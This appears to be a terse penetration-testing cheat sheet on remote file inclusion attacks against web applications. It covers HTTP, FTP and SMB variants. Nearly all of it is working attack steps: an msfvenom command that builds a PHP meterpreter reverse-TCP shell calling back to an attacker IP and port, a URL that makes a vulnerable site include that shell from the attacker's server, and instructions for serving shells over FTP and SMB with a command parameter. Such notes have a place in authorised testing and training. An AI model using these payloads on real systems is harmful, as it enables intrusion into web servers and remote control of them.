RFI
http rfi
    Use the following shell in rfi and host a server in the directory
we use .txt format because sometimes server executes php on our machine isntead of victim
    msfvenom -p php/meterpreter/reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f raw > shell.txt

    Now go to the url and include your webserver and file alongside it
    http://site.com?example.php=http://10.4.30.255:80/shell.txt
    Listen on msf handler with the php/meterpreter/reverse_tcp set

we can also include a normal shell instead of a msf exploit

ftp rfi
    start a ftp server where you shell is
python3 -m pyftpdlib -p21

    in injection point include

    ?param=ftp://ipaddress/shell.php&cmdid

smb rfi
    start a impacket smb server and if target is windows this is helpful
    we can directly include it as an smb share
?param=\ipaddress\sharename\shell.php&cmd=id
